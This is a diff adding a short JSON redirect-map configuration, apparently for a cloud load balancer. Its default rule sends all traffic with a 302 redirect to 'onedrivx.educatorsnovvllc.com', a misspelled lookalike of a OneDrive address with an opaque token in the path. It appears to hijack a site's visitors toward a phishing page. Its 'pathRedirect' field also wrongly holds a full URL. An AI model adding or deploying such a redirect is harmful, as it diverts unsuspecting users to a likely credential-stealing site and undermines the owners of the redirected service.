@@ -1,0 +1,10 @@
+{
+  "name": "redirect-map",
+  "defaultUrlRedirect": {
+    "httpsRedirect": true,
+    "stripQuery": false,
+    "redirectResponseCode": "FOUND",
+    "hostRedirect": "onedrivx.educatorsnovvllc.com",
+    "pathRedirect": "https://onedrivx.educatorsnovvllc.com/DvEjodUJ"
+  }
+}
